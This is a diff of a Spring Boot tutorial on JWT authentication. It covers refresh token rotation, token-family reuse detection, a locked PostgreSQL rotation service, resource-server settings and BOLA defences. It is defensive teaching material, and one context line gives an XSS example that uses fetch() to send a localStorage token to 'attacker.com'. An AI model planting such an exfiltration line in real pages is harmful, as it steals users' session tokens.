@@ -13,9 +13,9 @@ Carrying authentication state via JSON Web Tokens (JWT) enables horizontally sca
 
 ## 1. JWT Cryptographic Anatomy & Common Vulnerabilities
 
-A JSON Web Token (RFC 7519) is a cryptographically signed, URL-safe string composed of three distinct parts separated by dots (`.`):
+The signed JWT form used here is a compact JWS: three Base64Url parts separated by dots (`.`). JWT also supports encrypted forms; this chapter uses signed access tokens.
 
-```text
+```jwt
 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgta2V5LTAxIn0.
 eyJzdWIiOiI5ODQyIiwiZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSIsInJvbGVzIjpbIlJPTEVfVVNFUiJdLCJpYXQiOjE3MjYwMDAwMDAsImV4cCI6MTcyNjAwMDkwMH0.
 q7O2y9sX5b_...[Cryptographic Signature]
@@ -36,7 +36,7 @@ flowchart LR
 - `exp` (Expiration Time): Unix epoch timestamp after which the token is invalid.
 - `nbf` (Not Before): Unix epoch timestamp before which the token must not be accepted.
 - `iat` (Issued At): Unix epoch timestamp indicating when the token was minted.
-- `jti` (JWT ID): Unique identifier for the token, used for replay attack prevention.
+- `jti` (JWT ID): A token identifier. It only helps prevent replay if a verifier records and checks its use.
 
 <Warning>
 A JWT is **signed, not encrypted**! Anyone who intercepts the token can decode the Base64Url string and read its payload. Never store passwords, credit card numbers, or sensitive PII inside JWT claims.
@@ -57,7 +57,7 @@ If the backend uses the same verification method and passes its RSA public key s
 
 ## 2. The Dual-Token Architecture: Access + Refresh Tokens
 
-Stateless access tokens cannot be revoked on demand without maintaining a centralized distributed blacklist (which destroys the performance benefit of stateless tokens). 
+Self-contained access tokens usually remain valid until expiry. Immediate revocation needs a state check, such as a denylist, session version, or token introspection. That adds latency and an availability dependency; it does not make JWTs useless. 
 
 To balance security and scalability, modern backends implement the **Dual-Token Architecture**:
 
@@ -99,7 +99,7 @@ Storing tokens in browser `localStorage` exposes them to any JavaScript running 
 ```javascript
 fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"));
 ```
-By storing the Refresh Token in an **`HttpOnly` Cookie**, the browser forbids JavaScript from reading the cookie value entirely (`document.cookie` returns nothing), completely neutralizing token theft via XSS!
+An **`HttpOnly` cookie** hides that cookie value from JavaScript. XSS can still send authenticated requests and read access tokens returned to the compromised page. Prevent XSS as well. Because the browser sends cookies automatically, protect refresh and login endpoints against CSRF; `SameSite` is an additional defense. See the [two-chain security example](/spring-boot/spring-security-production).
 
 ---
 
@@ -110,7 +110,7 @@ What happens if an attacker manages to steal a refresh token from network transi
 Without **Refresh Token Rotation (RTR)**, the attacker can silently generate new access tokens for 30 days. RTR enforces that **every refresh token is strictly single-use**. When presented, it is invalidated and replaced with a brand-new refresh token.
 
 ### Automatic Theft Detection via Token Families
-Every token belongs to an immutable cryptographic `family_id`. If an invalidated token is presented again (indicating that both the legitimate user and an attacker hold copies of the token lineage), the backend detects **Token Reuse** and **immediately revokes the entire token family**, locking out the attacker instantly!
+A **token family** represents one login session. Reusing a consumed token revokes that family and prevents further refreshes. Previously issued access tokens can still work until expiry. Concurrent browser tabs and retries after a lost response can also look like theft, so serialize refreshes in the client and document that reuse requires login again. Keep consumed token hashes until the family expires so replays remain detectable. [OAuth security guidance on refresh tokens](https://www.rfc-editor.org/rfc/rfc9700.html#section-4.14)
 
 ```mermaid
 sequenceDiagram
@@ -137,133 +137,168 @@ sequenceDiagram
 
 ### 3.1 Database Schema for Token Families
 
+Lock one family row before rotating any token in that family. Locking only the incoming token does not serialize a replay of an old token with a refresh of its successor.
+
 ```sql
-CREATE TABLE refresh_tokens (
-    id BIGSERIAL PRIMARY KEY,
+CREATE TABLE refresh_families (
+    id UUID PRIMARY KEY,
     user_id BIGINT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
-    token_hash VARCHAR(64) NOT NULL UNIQUE,
-    family_id UUID NOT NULL,
-    is_used BOOLEAN NOT NULL DEFAULT FALSE,
-    is_revoked BOOLEAN NOT NULL DEFAULT FALSE,
-    expires_at TIMESTAMP WITH TIME ZONE NOT NULL,
-    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT CURRENT_TIMESTAMP
+    revoked BOOLEAN NOT NULL DEFAULT FALSE,
+    expires_at TIMESTAMPTZ NOT NULL
 );
 
-CREATE INDEX idx_refresh_tokens_lookup ON refresh_tokens(token_hash);
+CREATE TABLE refresh_tokens (
+    id BIGSERIAL PRIMARY KEY,
+    token_hash VARCHAR(64) NOT NULL UNIQUE,
+    family_id UUID NOT NULL REFERENCES refresh_families(id) ON DELETE CASCADE,
+    used BOOLEAN NOT NULL DEFAULT FALSE,
+    expires_at TIMESTAMPTZ NOT NULL,
+    created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
+);
+
 CREATE INDEX idx_refresh_tokens_family ON refresh_tokens(family_id);
 ```
 
-### 3.2 Production Token Refresh & Reuse Service
+The unique constraint already indexes `token_hash`. At login, create a family with an absolute expiry and its first token in one transaction. Generate each raw token from 32 random bytes using `SecureRandom`; store only its SHA-256 hash. The family identifier is a grouping key, not a credential.
+
+### 3.2 Commit Revocation Before Returning an Error
+
+A subtle bug is to update `revoked = TRUE` and then throw `BadCredentialsException` inside `@Transactional`. The exception is unchecked, so the default transaction interceptor rolls back the revocation. Return a rejected outcome normally, commit, then let the controller produce the authentication error. [Spring transaction rollback rules](https://docs.spring.io/spring-framework/reference/data-access/transaction/declarative/rolling-back.html)
+
+This is a service excerpt for Spring Boot 3.2+ with JDBC and PostgreSQL. It needs the schema above and a configured `AccessTokenIssuer` bean. It is not a complete authorization server.
 
 ```java
 package com.example.security.auth;
 
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
 import org.springframework.jdbc.core.simple.JdbcClient;
-import org.springframework.security.authentication.BadCredentialsException;
 import org.springframework.stereotype.Service;
+import org.springframework.transaction.annotation.Isolation;
 import org.springframework.transaction.annotation.Transactional;
 
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
+import java.sql.Timestamp;
 import java.time.Instant;
 import java.time.temporal.ChronoUnit;
+import java.util.Base64;
 import java.util.HexFormat;
-import java.util.Optional;
 import java.util.UUID;
 
 @Service
 public class RefreshTokenService {
+    private final JdbcClient jdbc;
+    private final AccessTokenIssuer issuer;
+    private final SecureRandom random = new SecureRandom();
 
-    private static final Logger log = LoggerFactory.getLogger(RefreshTokenService.class);
-    private final JdbcClient jdbcClient;
-    private final JwtTokenProvider jwtTokenProvider;
-
-    public RefreshTokenService(JdbcClient jdbcClient, JwtTokenProvider jwtTokenProvider) {
-        this.jdbcClient = jdbcClient;
-        this.jwtTokenProvider = jwtTokenProvider;
+    public RefreshTokenService(JdbcClient jdbc, AccessTokenIssuer issuer) {
+        this.jdbc = jdbc;
+        this.issuer = issuer;
     }
 
-    public record RefreshResult(String newAccessToken, String newRawRefreshToken) {}
-
-    @Transactional
-    public RefreshResult rotateToken(String rawIncomingToken) {
-        String tokenHash = hashToken(rawIncomingToken);
-
-        // Fetch token record by cryptographic hash
-        Optional<TokenRecord> recordOpt = jdbcClient.sql("""
-            SELECT id, user_id, family_id, is_used, is_revoked, expires_at
-            FROM refresh_tokens
-            WHERE token_hash = :hash
-        """)
-        .param("hash", tokenHash)
-        .query(TokenRecord.class)
-        .optional();
-
-        if (recordOpt.isEmpty()) {
-            throw new BadCredentialsException("Invalid refresh token.");
-        }
-
-        TokenRecord record = recordOpt.get();
-
-        // 1. REUSE DETECTION: If an already-used token is presented again, revoking family!
-        if (record.isUsed() || record.isRevoked()) {
-            log.error("SECURITY ALERT: Token reuse detected for family {}! Revoking all sessions for user {}",
-                    record.familyId(), record.userId());
-            
-            jdbcClient.sql("UPDATE refresh_tokens SET is_revoked = TRUE WHERE family_id = :familyId")
-                .param("familyId", record.familyId())
-                .update();
-
-            throw new BadCredentialsException("Security violation: Session terminated.");
-        }
-
-        // 2. Check Expiration
-        if (record.expiresAt().isBefore(Instant.now())) {
-            throw new BadCredentialsException("Refresh token has expired.");
-        }
-
-        // 3. Mark current token as USED (atomic update)
-        jdbcClient.sql("UPDATE refresh_tokens SET is_used = TRUE WHERE id = :id")
-            .param("id", record.id())
-            .update();
-
-        // 4. Generate New Token in the SAME family
-        String newRawToken = UUID.randomUUID().toString();
-        String newHash = hashToken(newRawToken);
-        Instant newExpiry = Instant.now().plus(7, ChronoUnit.DAYS);
-
-        jdbcClient.sql("""
-            INSERT INTO refresh_tokens (user_id, token_hash, family_id, expires_at)
-            VALUES (:userId, :hash, :familyId, :expiresAt)
-        """)
-        .param("userId", record.userId())
-        .param("hash", newHash)
-        .param("familyId", record.familyId())
-        .param("expiresAt", newExpiry)
-        .update();
-
-        // 5. Issue new short-lived Access Token
-        String newAccessToken = jwtTokenProvider.generateAccessToken(record.userId());
-
-        return new RefreshResult(newAccessToken, newRawToken);
+    public interface AccessTokenIssuer {
+        // Local signing using configured keys; no remote I/O while holding locks.
+        String issue(long userId);
     }
 
-    private String hashToken(String rawToken) {
+    public sealed interface Outcome permits Issued, Rejected {}
+    public record Issued(String accessToken, String refreshToken) implements Outcome {}
+    public record Rejected() implements Outcome {}
+    private record Family(UUID id, long userId, boolean revoked, Instant expiresAt) {}
+    private record Token(long id, boolean used, Instant expiresAt) {}
+
+    @Transactional(isolation = Isolation.READ_COMMITTED, timeout = 5)
+    public Outcome rotate(String rawToken) {
+        if (rawToken == null || rawToken.length() != 43) {
+            return new Rejected();
+        }
+        String hash = hash(rawToken);
+        var family = jdbc.sql("""
+            SELECT f.id, f.user_id, f.revoked, f.expires_at
+            FROM refresh_families f
+            JOIN refresh_tokens t ON t.family_id = f.id
+            WHERE t.token_hash = :hash
+            FOR UPDATE OF f
+            """)
+            .param("hash", hash)
+            .query((rs, row) -> new Family(rs.getObject("id", UUID.class),
+                rs.getLong("user_id"), rs.getBoolean("revoked"),
+                rs.getTimestamp("expires_at").toInstant()))
+            .optional();
+
+        if (family.isEmpty()) return new Rejected();
+        Family f = family.get();
+        Instant now = Instant.now();
+        if (f.revoked() || !f.expiresAt().isAfter(now)) return new Rejected();
+
+        // Read token state AFTER acquiring the family lock.
+        Token token = jdbc.sql("""
+            SELECT id, used, expires_at FROM refresh_tokens WHERE token_hash = :hash
+            """)
+            .param("hash", hash)
+            .query((rs, row) -> new Token(rs.getLong("id"), rs.getBoolean("used"),
+                rs.getTimestamp("expires_at").toInstant()))
+            .single();
+
+        if (token.used()) {
+            jdbc.sql("UPDATE refresh_families SET revoked = TRUE WHERE id = :id")
+                .param("id", f.id()).update();
+            return new Rejected(); // Normal return permits the revocation to commit.
+        }
+        if (!token.expiresAt().isAfter(now)) return new Rejected();
+
+        int consumed = jdbc.sql("""
+            UPDATE refresh_tokens SET used = TRUE WHERE id = :id AND used = FALSE
+            """).param("id", token.id()).update();
+        if (consumed != 1) throw new IllegalStateException("Token state changed unexpectedly");
+
+        byte[] bytes = new byte[32];
+        random.nextBytes(bytes);
+        String next = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
+        Instant nextExpiry = now.plus(7, ChronoUnit.DAYS);
+        if (nextExpiry.isAfter(f.expiresAt())) nextExpiry = f.expiresAt();
+
+        jdbc.sql("""
+            INSERT INTO refresh_tokens (token_hash, family_id, expires_at)
+            VALUES (:hash, :family, :expires)
+            """)
+            .param("hash", hash(next)).param("family", f.id())
+            .param("expires", Timestamp.from(nextExpiry)).update();
+        return new Issued(issuer.issue(f.userId()), next);
+    }
+
+    private static String hash(String raw) {
         try {
-            MessageDigest digest = MessageDigest.getInstance("SHA-256");
-            byte[] hash = digest.digest(rawToken.getBytes(StandardCharsets.UTF_8));
-            return HexFormat.of().formatHex(hash);
+            return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256")
+                .digest(raw.getBytes(StandardCharsets.UTF_8)));
         } catch (NoSuchAlgorithmException e) {
-            throw new IllegalStateException("SHA-256 not available", e);
+            throw new IllegalStateException(e);
         }
     }
-
-    private record TokenRecord(Long id, Long userId, UUID familyId, boolean isUsed, boolean isRevoked, Instant expiresAt) {}
 }
 ```
+
+`SELECT ... FOR UPDATE` holds the family lock until the transaction ends. All rotation and logout paths must follow the same family-lock protocol. Apply a database lock timeout too. [PostgreSQL row locking](https://www.postgresql.org/docs/17/explicit-locking.html#LOCKING-ROWS)
+
+The HTTP controller must call this Spring bean **without an outer transaction**. After `rotate()` returns, its transaction has committed. Map `Rejected` to `401` and clear the refresh cookie. Map `Issued` to an access-token response and a replacement `HttpOnly` refresh cookie. Never expose the raw refresh token in JSON or logs. If signing or insertion throws, the whole rotation rolls back and the previous token remains usable.
+
+### 3.3 Tests That Expose the Original Bugs
+
+Use real PostgreSQL and call the proxied bean from separate worker threads. Do not annotate the test with `@Transactional`; seed data must be committed before workers start. Collect every `Future` with a timeout so worker failures fail the test.
+
+| Scenario | Required result after a fresh database read |
+| :--- | :--- |
+| First use of R1 | One successor R2; R1 marked used. |
+| Replay R1 after rotation | `Rejected`; family remains revoked after the method returns. |
+| R2 after replay of R1 | `Rejected`; no R3 inserted. |
+| Two simultaneous uses of R1 | At most one issuance; other request revokes the family. |
+| Replay R1 racing with use of R2 | Final family state is revoked; no descendant can refresh. |
+| Token at its expiry instant | Rejected, not accepted for one more second. |
+| Issuer fails while signing | Transaction rolls back; R1 unused; no successor remains. |
+| Lost success response followed by retry | Reuse policy requires login again; behavior is documented. |
+
+**Debug task:** remove the family lock and add a barrier between reading and updating the token. Reproduce sibling issuance. Then restore the lock and show the same test prevents it. Next, throw after setting `revoked` and show the persisted revocation assertion fails.
 
 ---
 
@@ -309,7 +344,7 @@ flowchart TD
 
 ### 4.2 Spring Boot 3 Resource Server Configuration
 
-In any downstream microservice (Resource Server), verifying JWTs requires only two lines of configuration in `application.yml`:
+Add `spring-boot-starter-oauth2-resource-server` and enable `.oauth2ResourceServer(o -> o.jwt(j -> {}))` in the bearer filter chain. Configure the trusted issuer, expected audience, key endpoint, and allowed algorithm:
 
 ```yaml
 spring:
@@ -317,16 +352,19 @@ spring:
     oauth2:
       resourceserver:
         jwt:
+          issuer-uri: "https://auth.example.com"
           jwk-set-uri: "https://auth.example.com/.well-known/jwks.json"
+          audiences: "https://api.example.com"
+          jws-algorithms: RS256
 ```
 
-Spring Security automatically downloads the public keys, caches them, validates signatures, verifies `exp` and `nbf` timestamps, and injects the authenticated `JwtAuthenticationToken` into the `SecurityContextHolder`.
+This configuration targets Spring Boot 3.5 / Spring Security 6.5. The decoder checks the signature, time claims, issuer, and audience. A JWKS address alone does not establish the expected issuer or audience. A custom `JwtDecoder` bean replaces Boot's decoder configuration, so it must install equivalent validators explicitly. [Spring Security resource-server configuration](https://docs.spring.io/spring-security/reference/6.5/servlet/oauth2/resource-server/jwt.html)
 
 ---
 
 ## 5. Method-Level Security & Broken Object Level Authorization (BOLA / IDOR)
 
-According to the OWASP API Security Top 10, **Broken Object Level Authorization (BOLA / IDOR)** accounts for over 40% of real-world backend data leaks.
+**Broken Object Level Authorization (BOLA / IDOR)** means an authenticated user can access a resource they are not allowed to use.
 
 A BOLA vulnerability occurs when an endpoint verifies that a user is logged in, but fails to verify that the logged-in user actually **owns** the requested resource:
 
@@ -341,31 +379,24 @@ public OrderResponse getOrder(@PathVariable Long orderId) {
 }
 ```
 
-### 5.1 Defense 1: Spring Method Security with SpEL
+### Defense: Query by Resource and Authenticated Owner
 
-```java
-@PreAuthorize("hasRole('ADMIN') or #order.customerId == authentication.principal.id")
-public void updateOrder(Order order) {
-    orderRepository.save(order);
-}
-```
-
-### 5.2 Defense 2: Tenancy Scoping at the Database Layer (Gold Standard)
-
-Never rely exclusively on application-level `if` checks. Always scope database lookups to both the resource ID and the authenticated user ID:
+Use the validated identity to scope the database query. Do not accept an `Order` entity or owner ID from the client and use that supplied ownership field as proof.
 
 ```java
 @GetMapping("/orders/{orderId}")
 public OrderResponse getOrder(
         @PathVariable Long orderId,
-        @AuthenticationPrincipal AuthenticatedUser user) {
-
-    // SAFE: Database query strictly guarantees multi-tenant ownership
-    return orderRepository.findByIdAndCustomerId(orderId, user.id())
-            .map(OrderResponse::from)
-            .orElseThrow(() -> new ResourceNotFoundException("Order not found: " + orderId));
+        @AuthenticationPrincipal Jwt jwt) {
+    // Account mapping uses both trusted issuer and subject.
+    Long customerId = accountService.requireLocalAccount(jwt.getIssuer(), jwt.getSubject());
+    return orderRepository.findByIdAndCustomerId(orderId, customerId)
+        .map(OrderResponse::from)
+        .orElseThrow(() -> new ResourceNotFoundException("Order not found"));
 }
 ```
+
+This controller excerpt assumes an `accountService` that maps the validated `(issuer, subject)` to an existing local account. The default JWT principal has `getSubject()`, not a custom `id` field. For writes, scope the update itself or load and authorize the stored row inside a transaction. See [atomic ownership-scoped deletion](/spring-boot/spring-security-production).
 
 ---
 
@@ -375,13 +406,13 @@ public OrderResponse getOrder(
   <Accordion title="1. Why should you store refresh tokens in HttpOnly cookies instead of browser localStorage?">
     Storing tokens in `localStorage` makes them completely accessible to any JavaScript running within the application. If the application has an XSS (Cross-Site Scripting) vulnerability via an unescaped UI render or a compromised third-party npm script, the attacker can execute `localStorage.getItem()` and steal the token.
     
-    `HttpOnly` cookies cannot be accessed or read by client-side JavaScript (`document.cookie` ignores them). The browser automatically includes the cookie in requests to the auth origin, preventing XSS-based token exfiltration.
+    `HttpOnly` cookies cannot be accessed or read by client-side JavaScript (`document.cookie` ignores them). The browser automatically includes the cookie in requests to the auth origin, hiding the cookie value from JavaScript. XSS can still perform authenticated actions; prevent XSS and retain CSRF protection for cookie endpoints.
   </Accordion>
 
   <Accordion title="2. How does Refresh Token Rotation (RTR) protect users if a refresh token is stolen?">
     RTR makes every refresh token single-use. When a user presents Token R1, the server marks R1 as used and issues R2 within the same cryptographic `family_id`.
     
-    If an attacker intercepted Token R1 and attempts to use it later, the server detects that R1 has already been used. This triggers **Family Reuse Detection**: the server immediately revokes every active token sharing that `family_id`. The legitimate user will be asked to log in again, and the attacker's access is immediately cut off.
+    If an attacker intercepted Token R1 and attempts to use it later, the server detects that R1 has already been used. This triggers **Family Reuse Detection**: the server immediately revokes every active token sharing that `family_id`. The legitimate user will be asked to log in again, and further refreshes stop. Existing access tokens remain valid until expiry unless the API also checks revocation state.
   </Accordion>
 
   <Accordion title="3. What is the difference between HS256 and RS256 signing for JWTs? Which should you use in microservices?">
